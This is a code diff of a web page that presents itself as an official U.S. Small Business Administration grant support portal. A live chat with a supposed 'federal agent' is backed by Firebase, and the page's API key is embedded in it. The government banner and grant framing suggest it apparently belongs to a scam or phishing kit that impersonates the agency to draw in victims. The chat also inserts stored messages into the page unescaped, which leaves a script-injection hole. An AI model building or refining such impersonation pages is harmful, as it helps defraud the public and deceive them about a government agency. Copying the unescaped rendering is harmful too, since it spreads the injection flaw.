@@ -6,64 +6,45 @@
     <title>SBA Portal | Secure Support</title>
     <style>
         :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
-        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; height: 100vh; display: flex; flex-direction: column; }
         
-        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
+        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; font-weight: 700; border-bottom: 1px solid #ddd; }
         .header { background: var(--sba-blue); color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
-        
-        .chat-container { max-width: 600px; margin: 20px auto; padding: 0 15px; height: 80vh; display: flex; flex-direction: column; }
-        .chat-area { background: white; flex: 1; display: flex; flex-direction: column; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; }
         
         #messageDisplay { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 12px; background: #f8fafc; }
         
-        .bubble { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 13.5px; line-height: 1.5; word-wrap: break-word; position: relative; }
-        .user { align-self: flex-end; background: var(--sba-accent); color: white; border-bottom-right-radius: 4px; box-shadow: 0 4px 8px rgba(30, 58, 138, 0.15); }
-        .admin { align-self: flex-start; background: white; color: #1e293b; border: 1px solid #cbd5e1; border-bottom-left-radius: 4px; }
+        /* Message Bubbles */
+        .bubble { max-width: 85%; padding: 12px 16px; border-radius: 18px; font-size: 14px; line-height: 1.4; word-wrap: break-word; }
+        .user { align-self: flex-end; background: var(--sba-accent); color: white; border-bottom-right-radius: 2px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .admin { align-self: flex-start; background: #e2e8f0; color: #1e293b; border-bottom-left-radius: 2px; border: 1px solid #cbd5e1; }
         
-        .typing { font-size: 11px; color: #64748b; margin-bottom: 10px; font-style: italic; display: none; }
-
-        .input-box { padding: 15px; border-top: 1px solid #e2e8f0; display: flex; gap: 10px; background: white; }
-        input { flex: 1; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; outline: none; font-size: 14px; }
-        .send-btn { background: var(--sba-accent); color: white; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; font-weight: 800; text-transform: uppercase; font-size: 12px; }
+        .input-box { padding: 15px; background: white; border-top: 1px solid #ddd; display: flex; gap: 10px; padding-bottom: 30px; }
+        input { flex: 1; padding: 12px; border: 1px solid #cbd5e1; border-radius: 25px; outline: none; font-size: 15px; }
+        .send-btn { background: var(--sba-accent); color: white; border: none; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 18px; }
     </style>
 </head>
 <body>
 
-    <div class="gov-banner">
-        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
-        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE SUPPORT
-    </div>
+    <div class="gov-banner">OFFICIAL U.S. GOVERNMENT SYSTEM</div>
 
     <div class="header">
-        <div style="display: flex; align-items: center; gap: 10px;">
-            <div style="width: 10px; height: 10px; background: #10b981; border-radius: 50%; border: 2px solid white;"></div>
-            <strong style="font-size: 13px; letter-spacing: 0.5px;">LIVE AGENT ONLINE</strong>
-        </div>
-        <button onclick="location.href='dashboard.html'" style="background:none; border:1px solid white; color:white; padding:5px 12px; border-radius:6px; cursor:pointer; font-size:11px; font-weight:bold;">EXIT</button>
+        <strong style="font-size: 14px;">SBA HELP DESK</strong>
+        <button onclick="location.href='dashboard.html'" style="background:none; border:1px solid white; color:white; padding:4px 10px; border-radius:5px; font-size:12px;">BACK</button>
     </div>
 
-    <div class="chat-container">
-        <div class="chat-area">
-            <div id="messageDisplay">
-                <div class="bubble admin">
-                    <b>[SBA SUPPORT]:</b> Welcome to the 2026 Grant Allocation Secure Channel. A federal agent is assigned to your file. How can we assist you today?
-                </div>
-            </div>
-            <div id="typingIndicator" class="typing" style="padding-left: 20px;">Agent is typing...</div>
-            <div class="input-box">
-                <input type="text" id="userInput" placeholder="Type your inquiry here...">
-                <button id="sendBtn" class="send-btn">SEND</button>
-            </div>
-        </div>
-        <p style="text-align: center; font-size: 9px; color: #94a3b8; margin-top: 12px; text-transform: uppercase; letter-spacing: 1px;">
-            Communications are monitored for FY2026 Compliance
-        </p>
+    <div id="messageDisplay">
+        <div class="bubble admin"><b>[SBA AGENT]:</b> Establishing secure connection... Please wait.</div>
+    </div>
+
+    <div class="input-box">
+        <input type="text" id="userInput" placeholder="Ask a question...">
+        <button id="sendBtn" class="send-btn">➤</button>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { getFirestore, doc, getDoc, collection, addDoc, query, where, onSnapshot, serverTimestamp, orderBy } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { getFirestore, collection, addDoc, query, where, onSnapshot, serverTimestamp, orderBy, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
@@ -78,14 +59,16 @@
         const auth = getAuth(app);
         const db = getFirestore(app);
 
-        let currentUserData = null;
+        let userName = "Applicant";
 
         onAuthStateChanged(auth, async (user) => {
             if (user) {
-                const userDoc = await getDoc(doc(db, "users", user.uid));
-                currentUserData = userDoc.exists() ? userDoc.data() : { fullName: "New Applicant" };
+                // Fetch User's Name once
+                const userSnap = await getDoc(doc(db, "users", user.uid));
+                if(userSnap.exists()) userName = userSnap.data().fullName;
 
-                // REAL-TIME LISTENER for messages
+                // REAL-TIME CHAT LISTENER
+                // This listens specifically for this user's messages + admin replies
                 const q = query(
                     collection(db, "support_tickets"), 
                     where("userId", "==", user.uid),
@@ -94,16 +77,17 @@
 
                 onSnapshot(q, (snapshot) => {
                     const display = document.getElementById('messageDisplay');
-                    // We clear and keep the very first greeting
-                    display.innerHTML = '<div class="bubble admin"><b>[SBA SUPPORT]:</b> Welcome to the 2026 Grant Allocation Secure Channel. A federal agent is assigned to your file. How can we assist you today?</div>';
+                    display.innerHTML = '<div class="bubble admin"><b>[SBA AGENT]:</b> Hello ' + userName + ', how can we help you with your grant today?</div>';
                     
                     snapshot.forEach(d => {
                         const m = d.data();
                         const div = document.createElement('div');
-                        div.className = `bubble ${m.sender === 'USER' ? 'user' : 'admin'}`;
+                        // If sender is ADMIN, bubble goes left. If USER, bubble goes right.
+                        div.className = `bubble ${m.sender === 'ADMIN' ? 'admin' : 'user'}`;
                         div.innerHTML = (m.sender === 'ADMIN' ? '<b>[AGENT]:</b> ' : '') + m.message;
                         display.appendChild(div);
                     });
+                    // Auto-scroll to the bottom so they see the newest message
                     display.scrollTop = display.scrollHeight;
                 });
             } else {
@@ -114,22 +98,29 @@
         const sendMessage = async () => {
             const input = document.getElementById('userInput');
             const msg = input.value.trim();
-            if(!msg || !auth.currentUser) return;
+            if(!msg) return;
 
-            input.value = ""; 
+            const user = auth.currentUser;
+            input.value = ""; // Clear input immediately
             
-            await addDoc(collection(db, "support_tickets"), {
-                userId: auth.currentUser.uid,
-                userName: currentUserData.fullName,
-                userEmail: auth.currentUser.email,
-                message: msg,
-                sender: "USER",
-                timestamp: serverTimestamp()
-            });
+            try {
+                await addDoc(collection(db, "support_tickets"), {
+                    userId: user.uid,
+                    userName: userName,
+                    message: msg,
+                    sender: "USER",
+                    timestamp: serverTimestamp()
+                });
+            } catch (err) {
+                console.error(err);
+                alert("Connection error. Try again.");
+            }
         };
 
         document.getElementById('sendBtn').onclick = sendMessage;
-        document.getElementById('userInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });
+        document.getElementById('userInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
     </script>
 </body>
 </html>
